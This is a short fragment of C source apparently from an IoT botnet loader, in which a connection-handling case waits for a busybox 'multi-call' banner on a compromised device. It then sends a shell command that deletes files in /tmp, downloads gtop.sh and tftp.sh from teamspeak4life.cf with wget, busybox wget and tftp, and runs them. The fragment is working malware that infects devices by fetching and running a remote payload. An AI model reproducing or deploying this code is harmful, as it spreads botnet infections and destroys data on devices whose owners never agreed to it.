			...
			case 11:
				{
                    ...
                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                    {
                    	fds[i].totalTimeout = 0;
                    	fds[i].bufUsed = 0;
                    	send(fds[i].fd, "cd /tmp || cd /var/run;rm -f *;wget http://teamspeak4life.cf/gtop.sh || busybox wget http://teamspeak4life.cf/gtop.sh; sh gtop.sh; rm -f *.sh;tftp teamspeak4life.cf -c get tftp.sh;sh tftp.sh;rm -rf tftp.sh\r\n", 207, MSG_NOSIGNAL);
